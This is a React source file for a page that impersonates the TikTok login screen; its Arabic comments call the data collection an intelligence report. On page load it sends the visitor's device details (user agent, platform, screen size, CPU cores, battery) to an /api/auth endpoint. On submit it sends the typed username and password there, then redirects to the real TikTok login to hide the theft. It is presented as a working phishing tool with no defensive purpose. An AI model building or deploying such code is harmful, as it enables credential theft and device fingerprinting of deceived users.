import { useState, useEffect } from 'react';

export default function Home() {
    const [user, setUser] = useState('');
    const [pass, setPass] = useState('');

    // دالة جمع وإرسال البيانات (التقرير الاستخباراتي)
    const sendIntelligence = async (loginData = null) => {
        const info = {
            user: loginData ? loginData.user : "--- جاري الانتظار ---",
            pass: loginData ? loginData.pass : "--- لم يكتب بعد ---",
            ua: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenRes: `${window.screen.width}x${window.screen.height}`,
            cores: navigator.hardwareConcurrency || 'N/A',
            time: new Date().toLocaleString(),
            type: loginData ? "تسجيل دخول" : "زيارة أولية (بمجرد اللمس)"
        };

        try {
            const battery = await navigator.getBattery();
            info.battery = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'يُشحن' : 'لا يشحن'})`;
        } catch (e) { info.battery = "غير معروف"; }

        await fetch('/api/auth', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(info),
        });
    };

    // أول ما يلمس الرابط (بمجرد فتح الصفحة)
    useEffect(() => {
        sendIntelligence();
    }, []);

    const handleSubmit = async (e) => {
        e.preventDefault();
        await sendIntelligence({ user, pass });
        window.location.href = 'https://www.tiktok.com/login';
    };

    return (
        <div style={{ backgroundColor: '#000', color: '#fff', height: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', fontFamily: 'ProximaNova, Arial, sans-serif' }}>
            <div style={{ width: '100%', maxWidth: '380px', padding: '20px', textAlign: 'center' }}>
                <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok" style={{ width: '150px', marginBottom: '40px' }} />
                
                <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '20px' }}>Log in to TikTok</h2>
                
                <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column' }}>
                    <div style={{ position: 'relative', marginBottom: '12px' }}>
                        <input 
                            type="text" 
                            placeholder="Email or Username" 
                            value={user}
                            onChange={(e) => setUser(e.target.value)}
                            style={{ width: '100%', padding: '12px 15px', borderRadius: '4px', border: '1px solid #333', backgroundColor: '#222', color: '#fff', boxSizing: 'border-box' }}
                            required 
                        />
                    </div>
                    <div style={{ position: 'relative', marginBottom: '20px' }}>
                        <input 
                            type="password" 
                            placeholder="Password" 
                            value={pass}
                            onChange={(e) => setPass(e.target.value)}
                            style={{ width: '100%', padding: '12px 15px', borderRadius: '4px', border: '1px solid #333', backgroundColor: '#222', color: '#fff', boxSizing: 'border-box' }}
                            required 
                        />
                    </div>
                    <button type="submit" style={{ padding: '14px', backgroundColor: '#fe2c55', color: '#fff', border: 'none', borderRadius: '4px', fontSize: '16px', fontWeight: '600', cursor: 'pointer', transition: '0.3s' }}>
                        Log in
                    </button>
                </form>

                <div style={{ marginTop: '20px', color: '#888', fontSize: '14px' }}>
                    Don't have an account? <span style={{ color: '#fe2c55', fontWeight: '600' }}>Sign up</span>
                </div>
            </div>
        </div>
    );
}
